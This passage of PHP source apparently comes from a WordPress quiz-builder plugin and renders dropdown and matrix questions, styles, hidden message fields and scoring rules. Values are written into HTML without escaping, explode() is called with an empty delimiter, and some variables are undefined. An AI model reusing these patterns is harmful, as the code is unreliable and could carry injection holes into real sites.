		$dropdown_html .= "<select name='select_answers' class='sqb_question_dropdown' id='sqb_question_dropdown_".$question_id."'>";
		$dropdown_html .= "<option value=''>".$question_setting['dropdown_default_value']."</option>";
		$dropdown_options = preg_replace('#\s+#',',',trim($question_setting['dropdown_values']));
		$dropdown_items_array = explode(',',$dropdown_options);
		foreach($dropdown_items_array as $dropdown_items){
			$replace_dropdown_items = str_replace('_', ' ', $dropdown_items);
			$dropdown_html .= "<option value=".$dropdown_items.">".$replace_dropdown_items."</option>";
		}
		$dropdown_html .= "</select>";
		$dropdown_html .= "</div>";
	}
	return $dropdown_html;
}

function getMatrixDataOuter($question_id,$answer_id,$matrix_label_text_value,$matrix_html){
	$added_values = true;
	  $matrix_html =  $matrix_html;
	  if(strpos($matrix_html, 'show_value_matrix_box') !== false) {
	  } else {
		$added_values = false;
	  }
	
	$matrix_label_text = '';
	$questionanswers = SQB_QuizAnswers::loadByQuestionIdAndAnswerId($question_id,$answer_id);
	
	$matrix_label_text_values = explode(',',$matrix_label_text_value);
	foreach ($questionanswers as $questionanswer) {
		$matrix_values = $questionanswer->matrix_values;
			$matrix_array = explode(',', $matrix_values);
			
			$iteration=0;
			foreach ($matrix_array as $val) {
				if($matrix_label_text_value != ''){
				$heading_title = explode('|',$matrix_label_text_values[$iteration]);
				$matrix_label_text .= '<th scope="col" width="150px"><div class="matrix_label_text">'.urldecode($heading_title[1]).'</div></th>';
				} else {
				$heading_title = $iteration; 
				$matrix_label_text .= '<th scope="col" width="150px"><div class="matrix_label_text">'.urldecode($heading_title).'</div></th>';
				}
				$iteration++;
			}
	}
	
	$added_values_class = '';
	if($added_values){
	$added_values_class = 'matrix_values_added';
	}
	
	$getMatrixDataOuter = '<div id="sqb-answer-matrix-table-scroll" class="sqb-answer-matrix-table-scroll '.$added_values_class.'">				 
		<div class="SQB-table-wrap">
		  <table class="SQB-main-table">
			<thead>
			  <tr>
				<th class="SQB-fixed-side" scope="col">&nbsp;</th>
				 '.$matrix_label_text.'				
			  </tr>
			</thead>
			<tbody>';
	return $getMatrixDataOuter;
}

function getMatrixDataInner($question_id,$answer_id,  $matrix_label_text_value){
	$answer_order = '';
	$matrix_label_text = '';
	$matrix_ans_text = '';
	$questionanswers = SQB_QuizAnswers::loadByQuestionIdAndAnswerId($question_id,$answer_id);
	$iteration = 1;
	$matrix_label_text_values1 = explode(',',$matrix_label_text_value);

	foreach ($questionanswers as $questionanswer) {
		
		$matrix_values = $questionanswer->matrix_values;
		$matrix_answers = $questionanswer->answer;
		$matrix_ans_text = $questionanswer->answer_title;
		
		$matrix_array = explode(',', $matrix_values);
		$random_var = rand(10,1000);
		
		 //echo "<pre>"; print_r($matrix_label_text_values1[$iteration]);
			$i = 0;
			foreach ($matrix_array as $matrix) { 
				$matrix_exp = explode('|', $matrix);
				$heading_title_arr = explode('|',$matrix_label_text_values1[$i]);
				$heading_title =  $heading_title_arr[1];
			
				$matrix_label_text .= '<td scope="col">
										<div class="sqb__radio-group">
											<input type="radio" class="sqb__radio-input sqb_and_field checkbox_fe matrix_answer_value" id="'.$answer_id.'_'.$matrix_exp[0].'-'.$random_var.'" data-id="'.$answer_id.'" value="'.$matrix_exp[0].'" data-assigned-value="'.$matrix_exp[1].'" name="matrix_answer_row'.$iteration.'_'.$question_id.'_'.$answer_id.'">
											<label class="sqb__label-radio" for="'.$answer_id.'_'.$matrix_exp[0].'-'.$random_var.'">
												<span class="sqb__radio-button"></span>
											</label>
										</div><div class="heading_title_th">'.urldecode($heading_title).'</div>
									   </td>';
									   $i++;
			}
			$iteration++;
		
	}
	
	$getMatrixDataInner = '<th class="SQB-fixed-side" scope="col"><div class="sql_ans_text ">'.$matrix_ans_text.' '.$answer_order.'</div></th>'.$matrix_label_text.'';	
	return $getMatrixDataInner;
}

function getMatrixDataEnd(){
	$getMatrixDataEnd = '</tbody>
		  </table>
		</div>
	</div>';
	return $getMatrixDataEnd;
}

function getMatrixData($answer_id, $matrixlabel , $answer_text){
	
	$matrix_label_array = explode("", $matrixlabel);
	foreach($matrix_label_array as $matrix_label){
		//$matrix_label_text .= '<td><input type="radio"><input type="text" value="0" style="display:none" class="answer_value"></td>';
		$matrix_label_text .= '<td><input type="radio"><input type="text" value="0"  class="answer_value"></td>';
	}
	
	$matrix_data = ' <tr class="sqb_ans_item" data-id="'.$answer_id.'" id="matrix_answer_'.$answer_id.'">
				<th class="SQB-fixed-side"><div class="sqb_tiny_mce_editor mce-content-body" >'.$answer_text.'</div></th>
				'.$matrix_label_text.' 					
			  </tr>	';
	return $matrix_data;
	
}

//get style And script
function sqbGetStyleAndScript(){
	if(wp_script_is('jquery')) {
		$jquerymain =""; 
		//add_action('wp_footer','sqb_style_scripts'); 
	} else {
		$jquerymain ="<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>";
	 	 
		
		return $jquerymain;					
	} 
}     
function sqb_style_scripts() {
	$random_var = rand(10,1000);
	wp_enqueue_script("sqb_math.min","//cdnjs.cloudflare.com/ajax/libs/mathjs/9.4.4/math.min.js", false, "10.0.2" );
	wp_enqueue_script('sqb_frontend-js', plugin_dir_url(__FILE__).'includes/js/sqb_frontend.js', array('jquery'), $random_var);
	wp_enqueue_script('sqb_poll-js', plugin_dir_url(__FILE__).'includes/js/sqb_poll.js', array('jquery'), $random_var);
	wp_enqueue_script('sqb_frontend_fe-js', plugin_dir_url(__FILE__).'includes/js/sqb_frontend_fe.js', array('jquery'), $random_var);
	wp_enqueue_script('sqb_chart-js', plugin_dir_url(__FILE__).'includes/js/chart_lib.js', array('jquery'), $random_var);
	wp_enqueue_style('sqb-awesome', '//stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');
	wp_enqueue_style('sqb-googleapis', '//fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Open+Sans:wght@300;400;600;700;800&family=Nunito:wght@400;500;600;700&display=swap');
	wp_enqueue_style('sqb-googleapis-raleway', '//fonts.googleapis.com/css2?family=Raleway:wght@100;200;300;400;500;700&display=swap');
	wp_enqueue_style('sqb-sqb_questions', plugin_dir_url(__FILE__).'includes/css/sqb_questions.css');
	wp_enqueue_style('sqb-sqb_common_backend', plugin_dir_url(__FILE__).'includes/css/sqb_common_backend.css');
	wp_enqueue_style('sqb-sqb_common', plugin_dir_url(__FILE__).'includes/css/sqb_common.css');
	wp_enqueue_style('sqb-question_ans_layout', plugin_dir_url(__FILE__).'includes/css/question_ans_layout.css');
	 
}
 
 
//get lesson quest style
function getLessonQuesAnsStyle(){ 
	$dap_questions_customizer = sqbGetValidSettingsByKey('dap_questions_customizer');
	$dap_answer_customizer = sqbGetValidSettingsByKey('dap_answer_customizer');
	 
	$dap_see_details_btn_customizer = explode('||' , $dap_see_details_btn_customizer);

	if($dap_see_details_btn_customizer[0]){
		$dap_see_details_btn_width = $dap_see_details_btn_customizer[0];
	}

	if($dap_see_details_btn_customizer[1]){
		$dap_see_details_btn_height = $dap_see_details_btn_customizer[1];
	}

	if($dap_see_details_btn_customizer[2]){
		$see_details_backgroud_color = $dap_see_details_btn_customizer[2];
	}
	
	$dap_questions_customizer = explode('||' , $dap_questions_customizer);
	$dap_questions_font = 17;
							   
	if($dap_questions_customizer[0]){
		$dap_questions_font = $dap_questions_customizer[0];
	} 
	
	$dap_answer_customizer = explode('||' , $dap_answer_customizer);								   
	$dap_answer_font = '14';
	$dap_answer_font_weigth = '500';
	$dap_answer_background_color = '#f7f7f7';
	$dap_answer_active_background_color = '#4f6cbf';

 
	if(isset($dap_answer_customizer[0])){
		$dap_answer_font = $dap_answer_customizer[0];
	}
	if(isset($dap_answer_customizer[1])){
		$dap_answer_font_weigth = $dap_answer_customizer[1];
	}
	if(isset($dap_answer_customizer[2])){
		$dap_answer_background_color = $dap_answer_customizer[2];
	}
	if(isset($dap_answer_customizer[3])){
		$dap_answer_active_background_color = $dap_answer_customizer[3];
	}	 
	    
	if($dap_answer_font ==0 ){
		$dap_answer_font = 13;
	}
	$style='<style>.Quiz-Template-content .quiz_pagination_all p, #sqb_quiz_builder .Quiz-Template .quiz_pagination_all .Quiz-Template-title, #sqb_quiz_builder .quiz_pagination_all .Quiz-Template-title{    font-size: '.$dap_questions_font.'px !important;} 	
	
	.quiz_pagination_all .question_add_answer_outer_div .sqb_ans_item .sql_ans_text{    font-size: '.$dap_answer_font.'px !important; font-weight: '.$dap_answer_font_weigth.';} 
	
	.quiz_pagination_all  .answer_container.grid-layout-active .sqb_ans_item_outer, .quiz_pagination_all  .answer_container:not(.image_option_has):not(.grid-layout-active) .sqb_ans_item_outer .sqb_ans_item {    background-color:  '.$dap_answer_background_color.';} 
			
	.quiz_pagination_all .question_add_answer_outer_div .sqb_ans_item:hover, .quiz_pagination_all  .question_add_answer_outer_div .sqb_ans_item:hover *, 
	  .quiz_pagination_all  .question_add_answer_outer_div .addselected *, .quiz_pagination_all  .question_add_answer_outer_div .sqb_ans_selected .sqb_ans_item,   .quiz_pagination_all  .question_add_answer_outer_div .sqb_ans_selected .sqb_ans_item *, .quiz_pagination_all  .answer_container.grid-layout-active .sqb_ans_item_outer:hover, 
	  #sqb_quiz_builder .quiz_pagination_all  .question_container.single_fillin_text .sqb_ans_item:hover input, #sqb_quiz_builder .quiz_pagination_all  .question_container.single_fillin_text .sqb_ans_item:hover textarea, .quiz_pagination_all  .question_add_answer_outer_div .sqb_ans_item_outer.multiple_cls.sqb_ans_selected, .quiz_pagination_all  .answer_container.grid-layout-active .sqb_ans_item_outer.single_cls.sqb_ans_selected, .quiz_pagination_all  .answer_container:not(.image_option_has):not(.grid-layout-active) .sqb_ans_item_outer:hover .sqb_ans_item{  background-color: '.$dap_answer_active_background_color.' !important;}</style>
	  
	';
	return $style;
	
}


function sqb_default_messages_for_form_quiz(){
	$correct_answer_msg = sqbGetValidSettingsByKey('correct_answer_msg');
	if($correct_answer_msg == ""){
		$correct_answer_msg =  'This is the correct answer.' ;
	}
	
	$incorrect_answer_msg = sqbGetValidSettingsByKey('incorrect_answer_msg');
	if($incorrect_answer_msg == ""){
		$incorrect_answer_msg =  'This answer is incorrect.';
	}
	
	$username_empty_msg = sqbGetValidSettingsByKey('username_empty_msg');
	if($username_empty_msg == ""){
		$username_empty_msg =  'Username is a required field.';
	}				
	 
	$email_empty_msg = sqbGetValidSettingsByKey('email_empty_msg');
	if($email_empty_msg == ""){
		$email_empty_msg =   'Email is a required field.';
	}
	$valid_email = sqbGetValidSettingsByKey('valid_email');
	if($valid_email == ""){
		$valid_email =  'Please enter a valid email address.';
	}
	$terms_condition_msg = sqbGetValidSettingsByKey('terms_condition_msg');
	if($terms_condition_msg == ""){
		$terms_condition_msg =  'Please accept the terms to proceed.';
	}
	$progressSettings = sqbGetValidSettingsByKey('progressbar_color');
	if($progressSettings == ""){
		$progressSettings = '#007bff||#e9ecef';
	}
	$answer_background = sqbGetValidSettingsByKey('answer_background');
	if($answer_background == ""){
		$answer_background = '#007bff||#e9ecef';
	}				  
	$answer_background = explode('||' , $answer_background);
	
	$upload_button_text = sqbGetValidSettingsByKey('upload_button_text');
	if($upload_button_text == ""){
		$upload_button_text = 'Upload';
	}
	$uploaded_filename_text = sqbGetValidSettingsByKey('uploaded_filename_text');
	if($uploaded_filename_text == ""){
		$uploaded_filename_text = 'Filename:';
	}
	$file_uploaded_message = sqbGetValidSettingsByKey('file_uploaded_message');
	if($file_uploaded_message == ""){
		$file_uploaded_message = 'File uploaded successfully';
	}
	$file_upload_failed_message = sqbGetValidSettingsByKey('file_upload_failed_message');
	if($file_upload_failed_message == ""){
		$file_upload_failed_message = 'Sorry, this file extension is not supported.';
	}
	$upload_filesize_limit_exceeds_message = sqbGetValidSettingsByKey('upload_filesize_limit_exceeds_message');
	if($upload_filesize_limit_exceeds_message == ""){
		$upload_filesize_limit_exceeds_message = 'Sorry, this file exceeds the allowed file size limit.';
	}
	$file_upload_validation = sqbGetValidSettingsByKey('file_upload_validation');
	if($file_upload_validation == ""){
		$file_upload_validation = 'Please upload a file.';
	}
	$required_field = sqbGetValidSettingsByKey('required_field');
	if($required_field == ""){
		$required_field = 'Required field cannot be empty.';
	} 

	$gdpr_required_field = sqbGetValidSettingsByKey('gdpr_required_field');
	if($gdpr_required_field == ""){
		$gdpr_required_field = 'Please select checkbox.';
	} 

	$outcome_screen_answer = sqbGetValidSettingsByKey('outcome_screen_answer');
	if($outcome_screen_answer == ""){
		$outcome_screen_answer = 'Your Answer:';
	} 

	$outcome_screen_result = sqbGetValidSettingsByKey('outcome_screen_result');
	if($outcome_screen_result == ""){
		$outcome_screen_result = 'Your Result:';
	} 

	$outcome_screen_correct_answer = sqbGetValidSettingsByKey('outcome_screen_correct_answer');
	if($outcome_screen_correct_answer == ""){
		$outcome_screen_correct_answer = 'Correct Answer:';
	} 

	$outcome_screen_incorrect_answer = sqbGetValidSettingsByKey('outcome_screen_incorrect_answer');
	if($outcome_screen_incorrect_answer == ""){
		$outcome_screen_incorrect_answer = 'Incorrect Answer Explanation:';
	} 


	$settings_data ='					
	<input type="hidden" id="common_correct_msg" value="'.$correct_answer_msg.'"/>
	<input type="hidden" id="common_incorrect_msg" value="'.$incorrect_answer_msg.'"/>
	<input type="hidden" id="username_empty_msg" value="'.$username_empty_msg.'"/>
	<input type="hidden" id="email_empty_msg" value="'.$email_empty_msg.'"/>
	<input type="hidden" id="terms_condition_msg" value="'.$terms_condition_msg.'"/>
	<input type="hidden" id="progressSettings" value="'.$progressSettings.'"/>	
	<input type="hidden" id="valid_email" value="'.$valid_email.'"/>	
	<input type="hidden" id="uploaded_filename_text" value="'.$uploaded_filename_text.'"/>
	<input type="hidden" id="upload_button_text" value="'.$upload_button_text.'"/>
	<input type="hidden" id="file_uploaded_message" value="'.$file_uploaded_message.'"/>
	<input type="hidden" id="file_upload_failed_message" value="'.$file_upload_failed_message.'"/>
	<input type="hidden" id="upload_filesize_limit_exceeds_message" value="'.$upload_filesize_limit_exceeds_message.'"/>
	<input type="hidden" id="file_upload_validation" value="'.$file_upload_validation.'"/> 
	<input type="hidden" id="sqb_required_field" value="'.$required_field.'"/> 
	<input type="hidden" id="sqb_gdpr_required_field" value="'.$gdpr_required_field.'"/> 
	<input type="hidden" id="sqb_outcome_screen_answer_field" value="'.$outcome_screen_answer.'"/> 
	<input type="hidden" id="sqb_outcome_screen_result_field" value="'.$outcome_screen_result.'"/> 
	<input type="hidden" id="sqb_outcome_screen_correct_answer_field" value="'.$outcome_screen_correct_answer.'"/> 
	<input type="hidden" id="sqb_outcome_screen_incorrect_answer_field" value="'.$outcome_screen_incorrect_answer.'"/> 
	 ';
	 return $settings_data;
}


//get Category Calculations
function sqbCategoryCalculations($quizid , $quiz_type, $category_option ){	
	
	$cat_advanced_rules='<input value="0" type="hidden" id="final_cate_val"/>';	 
	$formula_advanced_rules='<input value="0" type="hidden" id="final_formula_val"/>';	 
	$formuladata = '';
	$rule_data_all = SQB_AdvancedRule::loadByQuizIdNew($quizid);	
	//loadByQuizId($id)
	//echo "<pre>"; print_r($rule_data_all);	
	if(is_array($rule_data_all) && count($rule_data_all)){
		foreach($rule_data_all as $rule_data){				 
			
			//added for scoring quizzes category thing
			if($quiz_type == "scoring"){
				$category_id = $rule_data->getCategoryId();
				if($category_id > 0){
					$enabled_category_advanced = $rule_data->getEnabledAdvanced();
					if($enabled_category_advanced =="Y"){
						if($category_option != null){
							
							$category_option_explode = explode('|', $category_option);
							
							if($category_option_explode[0] == 'category_highest'){
								$range_or_num = 'category_highest';
							}else{
								$range = $category_option_explode[1];
								if($range != null){
									$range_or_num = 'category_total';
									$range_arr = explode('-', $range);
									$start_range = $range_arr[0];
									$end_range = $range_arr[1];

									$start_range = $rule_data->getStartRange();
									$end_range = $rule_data->getEndRange();
								}
							}
						}
						$outcome_id = $rule_data->getOutcomeId(); 
						/*$category_total = $rule_data->getCategoryTotal();
						$cat_explode = explode('|', $category_total);
						$outcome_id = $rule_data->getOutcomeId(); 
						$range_or_num = $cat_explode[0];
						$range = $cat_explode[1];*/
						if($range_or_num == "range"){
							$range_arr = explode('-', $range);
							$start_range = $range_arr[0];
							$end_range = $range_arr[1];
							$start_range = $rule_data->getStartRange();
							$end_range = $rule_data->getEndRange();
						}					 
						$cat_advanced_rules .= '<input type="hidden" class="cat_advanced_rules cat_advanced_rules_'.$range_or_num.'" id="cat_advanced_rules_id" data-title="'.$range_or_num.'"  data-range="'.@$range.'" data-start="'.@$start_range.'" data-end="'.@$end_range.'" data-categoryid="'.$category_id.'" value="'.$outcome_id.'">';
					}
				}
			}
			//added for calculator type quizzes for fomula mapping
			if($quiz_type == "calculator"){
				$all_outcome = array();
				$outcome_obj = SQB_Outcome::loadByQuizId($quiz_id);
				if(is_array($outcome_obj) && count($outcome_obj)) {					 
					foreach($outcome_obj as $outcome_detail){
						$outcome_id = $outcome_detail->getid();
						$all_outcome[] = $outcome_id; 						 
					}
				} 
				 
				$formula_id = $rule_data->getFormulaId(); 
				if($formula_id > 0){
					$enabled_category_advanced = $rule_data->getEnabledAdvanced();
					$quiz_id = $rule_data->getQuizId();
					$rule_formula_data = SQB_CalculatorFormula::loadByQuizId($quiz_id);
					
					if(is_array($rule_formula_data) && count($rule_formula_data)>0){
						foreach($rule_formula_data as $formula_data){
							$formula_id1 = $formula_data->getId(); 
							$formuladata .= getSQBFormulaData($formula_id1); 
						}
					}
				
						
					if(is_array($rule_formula_data) && count($rule_formula_data)>0){
						foreach($rule_formula_data as $formula_data){	
							if($enabled_category_advanced =="Y"){
								$formula_id1 = $formula_data->getId(); 
								$category_total = $rule_data->getCategoryTotal();
								$cat_explode = explode('|', $category_total);
								$outcome_id = $rule_data->getOutcomeId(); 
								$priority = $rule_data->getFormulaPriority(); 
								$range_or_num = $cat_explode[0];
								$range = $cat_explode[1];
								if($range_or_num == "range"){
									$range_arr = explode('-', $range);
									$start_range = $range_arr[0];
									$end_range = $range_arr[1];
								}
								
								if(in_array($outcome_id, $all_outcome )){
								
									$formula_advanced_rules .= '<input type="hidden" class="formula_advanced_rules formula_advanced_rules_'.$range_or_num.'" id="formula_advanced_rules_id" data-title="'.$range_or_num.'"  data-range="'.$range.'" data-start="'.$start_range.'" data-end="'.$end_range.'" data-priority="'.$priority.'" data-formulaid="'.$formula_id.'" value="'.$outcome_id.'">';
									
								}
							}
						}
					}
				} 
			}
		}
	}
		$formuladata = '<div class="formuladatatest" style="display:none!important">'.$formuladata.'</div>';	
	return $formuladata.$cat_advanced_rules.$formula_advanced_rules;
		 
}